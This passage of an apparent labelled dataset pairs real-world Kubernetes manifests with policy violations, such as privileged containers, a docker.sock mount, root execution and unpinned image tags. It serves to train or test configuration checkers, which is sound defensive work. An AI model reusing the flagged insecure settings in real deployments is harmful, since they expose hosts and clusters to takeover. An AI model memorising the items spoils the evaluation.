'2.8.0=quay.io/strimzi/kafka:0.27.1-kafka-2.8.0\n\n            2.8.1=quay.io/strimzi/kafka:0.27.1-kafka-2.8.1\n\n            3.0.0=quay.io/strimzi/kafka:0.27.1-kafka-3.0.0\n\n            '\n        - name: STRIMZI_KAFKA_CONNECT_IMAGES\n          value: '2.8.0=quay.io/strimzi/kafka:0.27.1-kafka-2.8.0\n\n            2.8.1=quay.io/strimzi/kafka:0.27.1-kafka-2.8.1\n\n            3.0.0=quay.io/strimzi/kafka:0.27.1-kafka-3.0.0\n\n            '\n        - name: STRIMZI_KAFKA_MIRROR_MAKER_IMAGES\n          value: '2.8.0=quay.io/strimzi/kafka:0.27.1-kafka-2.8.0\n\n            2.8.1=quay.io/strimzi/kafka:0.27.1-kafka-2.8.1\n\n            3.0.0=quay.io/strimzi/kafka:0.27.1-kafka-3.0.0\n\n            '\n        - name: STRIMZI_KAFKA_MIRROR_MAKER_2_IMAGES\n          value: '2.8.0=quay.io/strimzi/kafka:0.27.1-kafka-2.8.0\n\n            2.8.1=quay.io/strimzi/kafka:0.27.1-kafka-2.8.1\n\n            3.0.0=quay.io/strimzi/kafka:0.27.1-kafka-3.0.0\n\n            '\n        - name: STRIMZI_DEFAULT_TOPIC_OPERATOR_IMAGE\n          value: quay.io/strimzi/operator:0.27.1\n        - name: STRIMZI_DEFAULT_USER_OPERATOR_IMAGE\n          value: quay.io/strimzi/operator:0.27.1\n        - name: STRIMZI_DEFAULT_KAFKA_INIT_IMAGE\n          value: quay.io/strimzi/operator:0.27.1\n        - name: STRIMZI_DEFAULT_KAFKA_BRIDGE_IMAGE\n          value: quay.io/strimzi/kafka-bridge:0.21.3\n        - name: STRIMZI_DEFAULT_JMXTRANS_IMAGE\n          value: quay.io/strimzi/jmxtrans:0.27.1\n        - name: STRIMZI_DEFAULT_KANIKO_EXECUTOR_IMAGE\n          value: quay.io/strimzi/kaniko-executor:0.27.1\n        - name: STRIMZI_DEFAULT_MAVEN_BUILDER\n          value: quay.io/strimzi/maven-builder:0.27.1\n        - name: STRIMZI_OPERATOR_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: STRIMZI_FEATURE_GATES\n          value: ''\n        livenessProbe:\n          httpGet:\n            path: /healthy\n            port: http\n          initialDelaySeconds: 10\n          periodSeconds: 30\n        readinessProbe:\n          httpGet:\n            path: /ready\n            port: http\n          initialDelaySeconds: 10\n          periodSeconds: 30\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 384Mi\n          requests:\n            cpu: 200m\n            memory: 384Mi\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"strimzi-cluster-operator\" not found"
  },
  {
    "id": "8448",
    "manifest_path": "data/manifests/the_stack_sample/sample_3147.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: strimzi-cluster-operator\n  labels:\n    app: strimzi\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: strimzi-cluster-operator\n      strimzi.io/kind: cluster-operator\n  template:\n    metadata:\n      labels:\n        name: strimzi-cluster-operator\n        strimzi.io/kind: cluster-operator\n    spec:\n      serviceAccountName: strimzi-cluster-operator\n      volumes:\n      - name: strimzi-tmp\n        emptyDir:\n          medium: Memory\n          sizeLimit: 1Mi\n      - name: co-config-volume\n        configMap:\n          name: strimzi-cluster-operator\n      containers:\n      - name: strimzi-cluster-operator\n        image: quay.io/strimzi/operator:0.27.1\n        ports:\n        - containerPort: 8080\n          name: http\n        args:\n        - /opt/strimzi/bin/cluster_operator_run.sh\n        volumeMounts:\n        - name: strimzi-tmp\n          mountPath: /tmp\n        - name: co-config-volume\n          mountPath: /opt/strimzi/custom-config/\n        env:\n        - name: STRIMZI_NAMESPACE\n          value: kafka\n        - name: STRIMZI_FULL_RECONCILIATION_INTERVAL_MS\n          value: '120000'\n        - name: STRIMZI_OPERATION_TIMEOUT_MS\n          value: '300000'\n        - name: STRIMZI_DEFAULT_TLS_SIDECAR_ENTITY_OPERATOR_IMAGE\n          value: quay.io/strimzi/kafka:0.27.1-kafka-3.0.0\n        - name: STRIMZI_DEFAULT_KAFKA_EXPORTER_IMAGE\n          value: quay.io/strimzi/kafka:0.27.1-kafka-3.0.0\n        - name: STRIMZI_DEFAULT_CRUISE_CONTROL_IMAGE\n          value: quay.io/strimzi/kafka:0.27.1-kafka-3.0.0\n        - name: STRIMZI_DEFAULT_TLS_SIDECAR_CRUISE_CONTROL_IMAGE\n          value: quay.io/strimzi/kafka:0.27.1-kafka-3.0.0\n        - name: STRIMZI_KAFKA_IMAGES\n          value: '2.8.0=quay.io/strimzi/kafka:0.27.1-kafka-2.8.0\n\n            2.8.1=quay.io/strimzi/kafka:0.27.1-kafka-2.8.1\n\n            3.0.0=quay.io/strimzi/kafka:0.27.1-kafka-3.0.0\n\n            '\n        - name: STRIMZI_KAFKA_CONNECT_IMAGES\n          value: '2.8.0=quay.io/strimzi/kafka:0.27.1-kafka-2.8.0\n\n            2.8.1=quay.io/strimzi/kafka:0.27.1-kafka-2.8.1\n\n            3.0.0=quay.io/strimzi/kafka:0.27.1-kafka-3.0.0\n\n            '\n        - name: STRIMZI_KAFKA_MIRROR_MAKER_IMAGES\n          value: '2.8.0=quay.io/strimzi/kafka:0.27.1-kafka-2.8.0\n\n            2.8.1=quay.io/strimzi/kafka:0.27.1-kafka-2.8.1\n\n            3.0.0=quay.io/strimzi/kafka:0.27.1-kafka-3.0.0\n\n            '\n        - name: STRIMZI_KAFKA_MIRROR_MAKER_2_IMAGES\n          value: '2.8.0=quay.io/strimzi/kafka:0.27.1-kafka-2.8.0\n\n            2.8.1=quay.io/strimzi/kafka:0.27.1-kafka-2.8.1\n\n            3.0.0=quay.io/strimzi/kafka:0.27.1-kafka-3.0.0\n\n            '\n        - name: STRIMZI_DEFAULT_TOPIC_OPERATOR_IMAGE\n          value: quay.io/strimzi/operator:0.27.1\n        - name: STRIMZI_DEFAULT_USER_OPERATOR_IMAGE\n          value: quay.io/strimzi/operator:0.27.1\n        - name: STRIMZI_DEFAULT_KAFKA_INIT_IMAGE\n          value: quay.io/strimzi/operator:0.27.1\n        - name: STRIMZI_DEFAULT_KAFKA_BRIDGE_IMAGE\n          value: quay.io/strimzi/kafka-bridge:0.21.3\n        - name: STRIMZI_DEFAULT_JMXTRANS_IMAGE\n          value: quay.io/strimzi/jmxtrans:0.27.1\n        - name: STRIMZI_DEFAULT_KANIKO_EXECUTOR_IMAGE\n          value: quay.io/strimzi/kaniko-executor:0.27.1\n        - name: STRIMZI_DEFAULT_MAVEN_BUILDER\n          value: quay.io/strimzi/maven-builder:0.27.1\n        - name: STRIMZI_OPERATOR_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: STRIMZI_FEATURE_GATES\n          value: ''\n        livenessProbe:\n          httpGet:\n            path: /healthy\n            port: http\n          initialDelaySeconds: 10\n          periodSeconds: 30\n        readinessProbe:\n          httpGet:\n            path: /ready\n            port: http\n          initialDelaySeconds: 10\n          periodSeconds: 30\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 384Mi\n          requests:\n            cpu: 200m\n            memory: 384Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"strimzi-cluster-operator\" is not set to runAsNonRoot"
  },
  {
    "id": "8449",
    "manifest_path": "data/manifests/the_stack_sample/sample_3149.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: c\nspec:\n  containers:\n  - name: loop\n    image: ovidiufeodorov/loop:latest\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"loop\" is using an invalid container image, \"ovidiufeodorov/loop:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8450",
    "manifest_path": "data/manifests/the_stack_sample/sample_3149.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: c\nspec:\n  containers:\n  - name: loop\n    image: ovidiufeodorov/loop:latest\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"loop\" does not have a read-only root file system"
  },
  {
    "id": "8451",
    "manifest_path": "data/manifests/the_stack_sample/sample_3149.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: c\nspec:\n  containers:\n  - name: loop\n    image: ovidiufeodorov/loop:latest\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"loop\" is not set to runAsNonRoot"
  },
  {
    "id": "8452",
    "manifest_path": "data/manifests/the_stack_sample/sample_3149.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: c\nspec:\n  containers:\n  - name: loop\n    image: ovidiufeodorov/loop:latest\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"loop\" has cpu request 0"
  },
  {
    "id": "8453",
    "manifest_path": "data/manifests/the_stack_sample/sample_3149.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: c\nspec:\n  containers:\n  - name: loop\n    image: ovidiufeodorov/loop:latest\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"loop\" has memory limit 0"
  },
  {
    "id": "8454",
    "manifest_path": "data/manifests/the_stack_sample/sample_3150.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  labels:\n    app: longhorn-manager\n  name: longhorn-manager\n  namespace: longhorn-system\nspec:\n  selector:\n    matchLabels:\n      app: longhorn-manager\n  template:\n    metadata:\n      labels:\n        app: longhorn-manager\n    spec:\n      containers:\n      - name: longhorn-manager\n        image: longhornio/longhorn-manager:master-head\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          privileged: true\n        command:\n        - longhorn-manager\n        - -d\n        - daemon\n        - --engine-image\n        - longhornio/longhorn-engine:master-head\n        - --instance-manager-image\n        - longhornio/longhorn-instance-manager:v1_20210731\n        - --share-manager-image\n        - longhornio/longhorn-share-manager:v1_20211020\n        - --backing-image-manager-image\n        - longhornio/backing-image-manager:v2_20210820\n        - --manager-image\n        - longhornio/longhorn-manager:master-head\n        - --service-account\n        - longhorn-service-account\n        ports:\n        - containerPort: 9500\n          name: manager\n        readinessProbe:\n          tcpSocket:\n            port: 9500\n        volumeMounts:\n        - name: dev\n          mountPath: /host/dev/\n        - name: proc\n          mountPath: /host/proc/\n        - name: longhorn\n          mountPath: /var/lib/longhorn/\n          mountPropagation: Bidirectional\n        env:\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n      volumes:\n      - name: dev\n        hostPath:\n          path: /dev/\n      - name: proc\n        hostPath:\n          path: /proc/\n      - name: longhorn\n        hostPath:\n          path: /var/lib/longhorn/\n      serviceAccountName: longhorn-service-account\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"longhorn-manager\" does not have a read-only root file system"
  },
  {
    "id": "8455",
    "manifest_path": "data/manifests/the_stack_sample/sample_3150.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  labels:\n    app: longhorn-manager\n  name: longhorn-manager\n  namespace: longhorn-system\nspec:\n  selector:\n    matchLabels:\n      app: longhorn-manager\n  template:\n    metadata:\n      labels:\n        app: longhorn-manager\n    spec:\n      containers:\n      - name: longhorn-manager\n        image: longhornio/longhorn-manager:master-head\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          privileged: true\n        command:\n        - longhorn-manager\n        - -d\n        - daemon\n        - --engine-image\n        - longhornio/longhorn-engine:master-head\n        - --instance-manager-image\n        - longhornio/longhorn-instance-manager:v1_20210731\n        - --share-manager-image\n        - longhornio/longhorn-share-manager:v1_20211020\n        - --backing-image-manager-image\n        - longhornio/backing-image-manager:v2_20210820\n        - --manager-image\n        - longhornio/longhorn-manager:master-head\n        - --service-account\n        - longhorn-service-account\n        ports:\n        - containerPort: 9500\n          name: manager\n        readinessProbe:\n          tcpSocket:\n            port: 9500\n        volumeMounts:\n        - name: dev\n          mountPath: /host/dev/\n        - name: proc\n          mountPath: /host/proc/\n        - name: longhorn\n          mountPath: /var/lib/longhorn/\n          mountPropagation: Bidirectional\n        env:\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n      volumes:\n      - name: dev\n        hostPath:\n          path: /dev/\n      - name: proc\n        hostPath:\n          path: /proc/\n      - name: longhorn\n        hostPath:\n          path: /var/lib/longhorn/\n      serviceAccountName: longhorn-service-account\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"longhorn-service-account\" not found"
  },
  {
    "id": "8456",
    "manifest_path": "data/manifests/the_stack_sample/sample_3150.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  labels:\n    app: longhorn-manager\n  name: longhorn-manager\n  namespace: longhorn-system\nspec:\n  selector:\n    matchLabels:\n      app: longhorn-manager\n  template:\n    metadata:\n      labels:\n        app: longhorn-manager\n    spec:\n      containers:\n      - name: longhorn-manager\n        image: longhornio/longhorn-manager:master-head\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          privileged: true\n        command:\n        - longhorn-manager\n        - -d\n        - daemon\n        - --engine-image\n        - longhornio/longhorn-engine:master-head\n        - --instance-manager-image\n        - longhornio/longhorn-instance-manager:v1_20210731\n        - --share-manager-image\n        - longhornio/longhorn-share-manager:v1_20211020\n        - --backing-image-manager-image\n        - longhornio/backing-image-manager:v2_20210820\n        - --manager-image\n        - longhornio/longhorn-manager:master-head\n        - --service-account\n        - longhorn-service-account\n        ports:\n        - containerPort: 9500\n          name: manager\n        readinessProbe:\n          tcpSocket:\n            port: 9500\n        volumeMounts:\n        - name: dev\n          mountPath: /host/dev/\n        - name: proc\n          mountPath: /host/proc/\n        - name: longhorn\n          mountPath: /var/lib/longhorn/\n          mountPropagation: Bidirectional\n        env:\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n      volumes:\n      - name: dev\n        hostPath:\n          path: /dev/\n      - name: proc\n        hostPath:\n          path: /proc/\n      - name: longhorn\n        hostPath:\n          path: /var/lib/longhorn/\n      serviceAccountName: longhorn-service-account\n",
    "policy_id": "privilege-escalation-container",
    "violation_text": "container \"longhorn-manager\" is Privileged hence allows privilege escalation."
  },
  {
    "id": "8457",
    "manifest_path": "data/manifests/the_stack_sample/sample_3150.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  labels:\n    app: longhorn-manager\n  name: longhorn-manager\n  namespace: longhorn-system\nspec:\n  selector:\n    matchLabels:\n      app: longhorn-manager\n  template:\n    metadata:\n      labels:\n        app: longhorn-manager\n    spec:\n      containers:\n      - name: longhorn-manager\n        image: longhornio/longhorn-manager:master-head\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          privileged: true\n        command:\n        - longhorn-manager\n        - -d\n        - daemon\n        - --engine-image\n        - longhornio/longhorn-engine:master-head\n        - --instance-manager-image\n        - longhornio/longhorn-instance-manager:v1_20210731\n        - --share-manager-image\n        - longhornio/longhorn-share-manager:v1_20211020\n        - --backing-image-manager-image\n        - longhornio/backing-image-manager:v2_20210820\n        - --manager-image\n        - longhornio/longhorn-manager:master-head\n        - --service-account\n        - longhorn-service-account\n        ports:\n        - containerPort: 9500\n          name: manager\n        readinessProbe:\n          tcpSocket:\n            port: 9500\n        volumeMounts:\n        - name: dev\n          mountPath: /host/dev/\n        - name: proc\n          mountPath: /host/proc/\n        - name: longhorn\n          mountPath: /var/lib/longhorn/\n          mountPropagation: Bidirectional\n        env:\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n      volumes:\n      - name: dev\n        hostPath:\n          path: /dev/\n      - name: proc\n        hostPath:\n          path: /proc/\n      - name: longhorn\n        hostPath:\n          path: /var/lib/longhorn/\n      serviceAccountName: longhorn-service-account\n",
    "policy_id": "privileged-container",
    "violation_text": "container \"longhorn-manager\" is privileged"
  },
  {
    "id": "8458",
    "manifest_path": "data/manifests/the_stack_sample/sample_3150.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  labels:\n    app: longhorn-manager\n  name: longhorn-manager\n  namespace: longhorn-system\nspec:\n  selector:\n    matchLabels:\n      app: longhorn-manager\n  template:\n    metadata:\n      labels:\n        app: longhorn-manager\n    spec:\n      containers:\n      - name: longhorn-manager\n        image: longhornio/longhorn-manager:master-head\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          privileged: true\n        command:\n        - longhorn-manager\n        - -d\n        - daemon\n        - --engine-image\n        - longhornio/longhorn-engine:master-head\n        - --instance-manager-image\n        - longhornio/longhorn-instance-manager:v1_20210731\n        - --share-manager-image\n        - longhornio/longhorn-share-manager:v1_20211020\n        - --backing-image-manager-image\n        - longhornio/backing-image-manager:v2_20210820\n        - --manager-image\n        - longhornio/longhorn-manager:master-head\n        - --service-account\n        - longhorn-service-account\n        ports:\n        - containerPort: 9500\n          name: manager\n        readinessProbe:\n          tcpSocket:\n            port: 9500\n        volumeMounts:\n        - name: dev\n          mountPath: /host/dev/\n        - name: proc\n          mountPath: /host/proc/\n        - name: longhorn\n          mountPath: /var/lib/longhorn/\n          mountPropagation: Bidirectional\n        env:\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n      volumes:\n      - name: dev\n        hostPath:\n          path: /dev/\n      - name: proc\n        hostPath:\n          path: /proc/\n      - name: longhorn\n        hostPath:\n          path: /var/lib/longhorn/\n      serviceAccountName: longhorn-service-account\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"longhorn-manager\" is not set to runAsNonRoot"
  },
  {
    "id": "8459",
    "manifest_path": "data/manifests/the_stack_sample/sample_3150.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  labels:\n    app: longhorn-manager\n  name: longhorn-manager\n  namespace: longhorn-system\nspec:\n  selector:\n    matchLabels:\n      app: longhorn-manager\n  template:\n    metadata:\n      labels:\n        app: longhorn-manager\n    spec:\n      containers:\n      - name: longhorn-manager\n        image: longhornio/longhorn-manager:master-head\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          privileged: true\n        command:\n        - longhorn-manager\n        - -d\n        - daemon\n        - --engine-image\n        - longhornio/longhorn-engine:master-head\n        - --instance-manager-image\n        - longhornio/longhorn-instance-manager:v1_20210731\n        - --share-manager-image\n        - longhornio/longhorn-share-manager:v1_20211020\n        - --backing-image-manager-image\n        - longhornio/backing-image-manager:v2_20210820\n        - --manager-image\n        - longhornio/longhorn-manager:master-head\n        - --service-account\n        - longhorn-service-account\n        ports:\n        - containerPort: 9500\n          name: manager\n        readinessProbe:\n          tcpSocket:\n            port: 9500\n        volumeMounts:\n        - name: dev\n          mountPath: /host/dev/\n        - name: proc\n          mountPath: /host/proc/\n        - name: longhorn\n          mountPath: /var/lib/longhorn/\n          mountPropagation: Bidirectional\n        env:\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n      volumes:\n      - name: dev\n        hostPath:\n          path: /dev/\n      - name: proc\n        hostPath:\n          path: /proc/\n      - name: longhorn\n        hostPath:\n          path: /var/lib/longhorn/\n      serviceAccountName: longhorn-service-account\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"longhorn-manager\" has cpu request 0"
  },
  {
    "id": "8460",
    "manifest_path": "data/manifests/the_stack_sample/sample_3150.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  labels:\n    app: longhorn-manager\n  name: longhorn-manager\n  namespace: longhorn-system\nspec:\n  selector:\n    matchLabels:\n      app: longhorn-manager\n  template:\n    metadata:\n      labels:\n        app: longhorn-manager\n    spec:\n      containers:\n      - name: longhorn-manager\n        image: longhornio/longhorn-manager:master-head\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          privileged: true\n        command:\n        - longhorn-manager\n        - -d\n        - daemon\n        - --engine-image\n        - longhornio/longhorn-engine:master-head\n        - --instance-manager-image\n        - longhornio/longhorn-instance-manager:v1_20210731\n        - --share-manager-image\n        - longhornio/longhorn-share-manager:v1_20211020\n        - --backing-image-manager-image\n        - longhornio/backing-image-manager:v2_20210820\n        - --manager-image\n        - longhornio/longhorn-manager:master-head\n        - --service-account\n        - longhorn-service-account\n        ports:\n        - containerPort: 9500\n          name: manager\n        readinessProbe:\n          tcpSocket:\n            port: 9500\n        volumeMounts:\n        - name: dev\n          mountPath: /host/dev/\n        - name: proc\n          mountPath: /host/proc/\n        - name: longhorn\n          mountPath: /var/lib/longhorn/\n          mountPropagation: Bidirectional\n        env:\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n      volumes:\n      - name: dev\n        hostPath:\n          path: /dev/\n      - name: proc\n        hostPath:\n          path: /proc/\n      - name: longhorn\n        hostPath:\n          path: /var/lib/longhorn/\n      serviceAccountName: longhorn-service-account\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"longhorn-manager\" has memory limit 0"
  },
  {
    "id": "8461",
    "manifest_path": "data/manifests/the_stack_sample/sample_3151.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: server\n        image: pzhivtsov/otus:hw4v0.0.2\n        env:\n        - name: PORT\n          value: '8080'\n        - name: PRODUCT_CATALOG_SERVICE_ADDR\n          value: productcatalogservice:3550\n        - name: CURRENCY_SERVICE_ADDR\n          value: currencyservice:7000\n        - name: CART_SERVICE_ADDR\n          value: cartservice:7070\n        - name: RECOMMENDATION_SERVICE_ADDR\n          value: recommendationservice:8080\n        - name: SHIPPING_SERVICE_ADDR\n          value: shippingservice:50051\n        - name: CHECKOUT_SERVICE_ADDR\n          value: checkoutservice:5050\n        - name: AD_SERVICE_ADDR\n          value: adservice:9555\n        - name: ENV_PLATFORM\n          value: gcp\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "8462",
    "manifest_path": "data/manifests/the_stack_sample/sample_3151.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: server\n        image: pzhivtsov/otus:hw4v0.0.2\n        env:\n        - name: PORT\n          value: '8080'\n        - name: PRODUCT_CATALOG_SERVICE_ADDR\n          value: productcatalogservice:3550\n        - name: CURRENCY_SERVICE_ADDR\n          value: currencyservice:7000\n        - name: CART_SERVICE_ADDR\n          value: cartservice:7070\n        - name: RECOMMENDATION_SERVICE_ADDR\n          value: recommendationservice:8080\n        - name: SHIPPING_SERVICE_ADDR\n          value: shippingservice:50051\n        - name: CHECKOUT_SERVICE_ADDR\n          value: checkoutservice:5050\n        - name: AD_SERVICE_ADDR\n          value: adservice:9555\n        - name: ENV_PLATFORM\n          value: gcp\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"server\" does not have a read-only root file system"
  },
  {
    "id": "8463",
    "manifest_path": "data/manifests/the_stack_sample/sample_3151.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: server\n        image: pzhivtsov/otus:hw4v0.0.2\n        env:\n        - name: PORT\n          value: '8080'\n        - name: PRODUCT_CATALOG_SERVICE_ADDR\n          value: productcatalogservice:3550\n        - name: CURRENCY_SERVICE_ADDR\n          value: currencyservice:7000\n        - name: CART_SERVICE_ADDR\n          value: cartservice:7070\n        - name: RECOMMENDATION_SERVICE_ADDR\n          value: recommendationservice:8080\n        - name: SHIPPING_SERVICE_ADDR\n          value: shippingservice:50051\n        - name: CHECKOUT_SERVICE_ADDR\n          value: checkoutservice:5050\n        - name: AD_SERVICE_ADDR\n          value: adservice:9555\n        - name: ENV_PLATFORM\n          value: gcp\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"server\" is not set to runAsNonRoot"
  },
  {
    "id": "8464",
    "manifest_path": "data/manifests/the_stack_sample/sample_3151.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: server\n        image: pzhivtsov/otus:hw4v0.0.2\n        env:\n        - name: PORT\n          value: '8080'\n        - name: PRODUCT_CATALOG_SERVICE_ADDR\n          value: productcatalogservice:3550\n        - name: CURRENCY_SERVICE_ADDR\n          value: currencyservice:7000\n        - name: CART_SERVICE_ADDR\n          value: cartservice:7070\n        - name: RECOMMENDATION_SERVICE_ADDR\n          value: recommendationservice:8080\n        - name: SHIPPING_SERVICE_ADDR\n          value: shippingservice:50051\n        - name: CHECKOUT_SERVICE_ADDR\n          value: checkoutservice:5050\n        - name: AD_SERVICE_ADDR\n          value: adservice:9555\n        - name: ENV_PLATFORM\n          value: gcp\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"server\" has cpu request 0"
  },
  {
    "id": "8465",
    "manifest_path": "data/manifests/the_stack_sample/sample_3151.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: server\n        image: pzhivtsov/otus:hw4v0.0.2\n        env:\n        - name: PORT\n          value: '8080'\n        - name: PRODUCT_CATALOG_SERVICE_ADDR\n          value: productcatalogservice:3550\n        - name: CURRENCY_SERVICE_ADDR\n          value: currencyservice:7000\n        - name: CART_SERVICE_ADDR\n          value: cartservice:7070\n        - name: RECOMMENDATION_SERVICE_ADDR\n          value: recommendationservice:8080\n        - name: SHIPPING_SERVICE_ADDR\n          value: shippingservice:50051\n        - name: CHECKOUT_SERVICE_ADDR\n          value: checkoutservice:5050\n        - name: AD_SERVICE_ADDR\n          value: adservice:9555\n        - name: ENV_PLATFORM\n          value: gcp\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"server\" has memory limit 0"
  },
  {
    "id": "8466",
    "manifest_path": "data/manifests/the_stack_sample/sample_3152.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: gpg-buildbox\n  labels:\n    name: gpg-buildbox\nspec:\n  containers:\n  - name: gpg-local-registry\n    image: registry\n    ports:\n    - name: gpg-local-reg\n      hostPort: 5000\n      containerPort: 5000\n  - name: gpg-buildbox\n    image: gridpgadmin/gpg-buildbox\n    securityContext:\n      privileged: true\n    ports:\n    - name: ssh\n      containerPort: 22\n      hostPort: 30022\n      protocol: TCP\n    volumeMounts:\n    - name: dockersock\n      mountPath: /var/run/docker.sock\n  volumes:\n  - name: dockersock\n    hostPath:\n      path: /var/run/docker.sock\n",
    "policy_id": "docker-sock",
    "violation_text": "host system directory \"/var/run/docker.sock\" is mounted on container \"gpg-buildbox\""
  },
  {
    "id": "8467",
    "manifest_path": "data/manifests/the_stack_sample/sample_3152.yaml",
